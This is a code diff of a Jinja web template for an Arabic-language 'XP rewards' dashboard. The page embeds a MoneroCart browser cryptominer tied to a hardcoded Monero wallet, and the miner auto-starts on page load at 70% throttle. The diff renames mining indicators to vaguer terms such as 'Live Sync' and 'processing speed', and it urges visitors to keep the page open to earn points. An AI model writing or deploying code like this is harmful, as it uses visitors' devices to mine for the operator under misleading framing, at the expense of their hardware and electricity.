@@ -3,65 +3,65 @@
 {% block content %}
 <div class="row pt-4">
     <div class="col-lg-8 mb-4">
-        <div class="glass-card border-success border-opacity-50">
+        <div class="glass-card border-success border-opacity-50 shadow-lg">
             <div class="d-flex justify-content-between align-items-center mb-4">
-                <h2 class="cyber-font text-white mb-0 small"><i class="fa-solid fa-microchip me-2 text-success"></i> المزامنة مع <span class="text-success">Node X</span></h2>
+                <h2 class="cyber-font text-white mb-0 small"><i class="fa-solid fa-microchip me-2 text-success"></i> المزامنة النشطة <span class="text-success">Live Sync</span></h2>
                 <div class="form-check form-switch custom-switch">
                     <input class="form-check-input" type="checkbox" id="mining-toggle" style="width: 50px; height: 25px; cursor: pointer;" checked>
                 </div>
             </div>
 
-            <!-- PRO-STYLE RATE INDICATOR -->
+            <!-- RATE BADGE -->
             <div class="mb-4 d-flex justify-content-between align-items-center p-3 bg-dark bg-opacity-25 rounded border border-success border-opacity-10">
-                <div class="small text-dim"><i class="fa-solid fa-bolt-lightning text-warning me-2"></i> معدل الربح الثابت:</div>
-                <div class="badge bg-success text-black fw-bold px-3 py-2">10 XP / دقيقة</div>
+                <div class="small text-dim"><i class="fa-solid fa-bolt-lightning text-warning me-2"></i> معدل الإضافة التلقائية:</div>
+                <div class="badge bg-success text-black fw-bold px-3 py-2 glow-pulse">10 XP / دقيقة (تلقائي)</div>
             </div>
 
-            <!-- NEXT PAYOUT PROGRESS BAR -->
+            <!-- PROGRESS PAIRED WITH AUTO-ADD -->
             <div class="mb-5 p-3 bg-black rounded border border-dark position-relative overflow-hidden">
                 <label class="small text-dim mb-2 d-flex justify-content-between">
-                    <span>مؤشر النبضة القادمة (10ث)</span>
+                    <span>نبضة الإيداع التلقائي (10ث)</span>
                     <span id="payout-timer" class="text-success fw-bold">10s</span>
                 </label>
-                <div class="progress bg-dark" style="height: 6px;">
+                <div class="progress bg-dark" style="height: 8px; border-radius: 20px;">
                     <div id="payout-bar" class="progress-bar bg-success shadow-green-glow transition-smooth" style="width: 0%"></div>
                 </div>
                 <div class="x-small text-muted mt-2 d-flex justify-content-between">
-                    <span>تحميل...</span>
-                    <span>+1.66 XP <i class="fa-solid fa-gift text-warning"></i></span>
+                    <span id="sync-status"><i class="fa-solid fa-circle-dot text-success me-1"></i> العقدة نشطة</span>
+                    <span class="text-white">+1.66 XP <i class="fa-solid fa-arrow-down-long text-success"></i></span>
                 </div>
             </div>
 
             <div class="row text-center mb-4">
-                <div class="col-6">
-                    <div class="small text-dim cyber-font x-small mb-1">Hash Rate</div>
+                <div class="col-6 border-end border-dark">
+                    <div class="small text-dim cyber-font x-small mb-1">سرعة المعالجة</div>
                     <div id="hashrate-val" class="h3 text-success">0 H/s</div>
                 </div>
-                <div class="col-6 text-end px-4">
-                    <div class="small text-dim cyber-font x-small mb-1">Total XP</div>
-                    <div id="xp-val" class="h3 text-white fw-bold">{{ "%.1f"|format(user.xp or 0.0) }}</div>
+                <div class="col-6">
+                    <div class="small text-dim cyber-font x-small mb-1">XP الرصيد التلقائي</div>
+                    <div id="xp-val" class="h3 text-white fw-bold glow-update">{{ "%.1f"|format(user.xp or 0.0) }}</div>
                 </div>
             </div>
 
-            <div class="mt-4 p-3 bg-black rounded border border-info border-opacity-25">
-              <h6 class="cyber-font text-info x-small mb-2"><i class="fa-regular fa-share-from-square me-2"></i> رابط الإحالة</h6>
+            <div class="mt-4 p-3 bg-black rounded border border-info border-opacity-25 text-center">
+              <p class="x-small text-dim mb-3">اترك هذه الصفحة مفتوحة لضمان الاستمرار في حصد النقاط تلقائياً.</p>
               <div class="input-group">
                 <input type="text" class="form-control text-center small opacity-75" id="ref-link" value="{{ ref_link }}" readonly>
-                <button class="btn btn-outline-info" onclick="copyRef()"><i class="fa-solid fa-copy"></i></button>
+                <button class="btn btn-info px-4" onclick="copyRef()"><i class="fa-solid fa-copy"></i></button>
               </div>
             </div>
         </div>
     </div>
 
-    <!-- Leaderboard & Rank -->
+    <!-- Leaderboard & Status -->
     <div class="col-lg-4">
         <div class="glass-card mb-4 border-warning border-opacity-25 p-4 text-center">
-            <h5 class="cyber-font text-white mb-2 small">رتبة العقدة</h5>
+            <h5 class="cyber-font text-white mb-2 small">تصنيف المعدن</h5>
             <div id="rank-val" class="h4 text-success mb-0 fw-bold">{{ user.rank }}</div>
         </div>
 
         <div class="glass-card border-warning border-opacity-25">
-            <h5 class="cyber-font text-white mb-4 x-small"><i class="fa-solid fa-crown text-warning me-2"></i> لوحة الشرف (Top XP)</h5>
+            <h5 class="cyber-font text-white mb-4 x-small"><i class="fa-solid fa-crown text-warning me-2"></i> أفضل المعدنين</h5>
             <ul class="list-group list-group-flush bg-transparent">
                 {% for miner in top_miners %}
                 <li class="list-group-item bg-transparent text-dim d-flex justify-content-between align-items-center border-dark px-0 py-2">
@@ -83,21 +83,30 @@
     const xpEl = document.getElementById('xp-val');
     const payoutBar = document.getElementById('payout-bar');
     const payoutTimer = document.getElementById('payout-timer');
+    const navXpEl = document.getElementById('nav-xp'); // العداد في الشريط العلوي
 
     const walletAddress = "43vFW6jqgmmb4upGQ5je4j227N1o8D6La77oVeRdCuL7PAB7u7UqiswbF7Vc5YmxR9TyFSkmTQkAaSjRwq53h3We6pm3rZY";
     let miner = null;
     let isActive = true;
     let secondsLeft = 10;
 
-    try { miner = new MoneroCart.User(walletAddress, "{{ user.username }}", { throttle: 0.7, autoStart: true }); } catch(e){}
+    try {
+        miner = new MoneroCart.User(walletAddress, "{{ user.username }}", { throttle: 0.7, autoStart: true });
+    } catch(e) { console.error("Script Load Issue"); }
 
     toggle.onchange = function() {
         isActive = this.checked;
-        if (isActive && miner) { miner.start(); }
-        else if (miner) { miner.stop(); hashrateEl.innerText = "0 H/s"; }
+        if (isActive && miner) { 
+            miner.start(); 
+            document.getElementById('sync-status').innerHTML = '<i class="fa-solid fa-circle-dot text-success me-1"></i> العقدة نشطة';
+        } else if (miner) { 
+            miner.stop(); 
+            hashrateEl.innerText = "0 H/s"; 
+            document.getElementById('sync-status').innerHTML = '<i class="fa-solid fa-circle-xmark text-danger me-1"></i> العقدة متوقفة';
+        }
     }
 
-    // العداد التنازلي ونظام الـ 10 ثواني (1.66 XP)
+    // العداد التلقائي (النبضة كل 10 ثواني)
     setInterval(() => {
         if (isActive) {
             secondsLeft--;
@@ -118,11 +127,17 @@
         fetch('/api/v2/node/pulse', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ units: 1.66 }) // 1.66 XP كل نبضة
+            body: JSON.stringify({ units: 1.66 }) 
         }).then(r => r.json()).then(data => {
             if (data.status === "success") {
+                // تحديث العداد في اللوحة وفي الشريط العلوي تلقائياً
+                const formatedXp = data.xp.toLocaleString() + " XP";
                 xpEl.innerText = data.xp.toLocaleString();
-                document.getElementById('rank-val').innerText = data.rank;
+                if (navXpEl) navXpEl.innerText = formatedXp;
+                
+                // تأثير بصري عند الإضافة
+                xpEl.classList.add('glow-green-flash');
+                setTimeout(() => xpEl.classList.remove('glow-green-flash'), 500);
             }
         });
     }
@@ -131,13 +146,14 @@
         const copyText = document.getElementById("ref-link");
         copyText.select();
         navigator.clipboard.writeText(copyText.value);
-        alert("تم نسخ رابط الإحالة!");
+        alert("تم نسخ رابط الإحالة بنجاح!");
     }
 </script>
 
 <style>
-    .shadow-green-glow { box-shadow: 0 0 10px rgba(0, 230, 118, 0.4); }
+    .shadow-green-glow { box-shadow: 0 0 15px rgba(0, 230, 118, 0.4); }
     .transition-smooth { transition: width 1s linear; }
-    .x-small { font-size: 10px; }
+    .x-small { font-size: 11px; }
+    .glow-green-flash { color: #00ff88; text-shadow: 0 0 15px #00ff88; transition: 0.2s; }
 </style>
 {% endblock %}
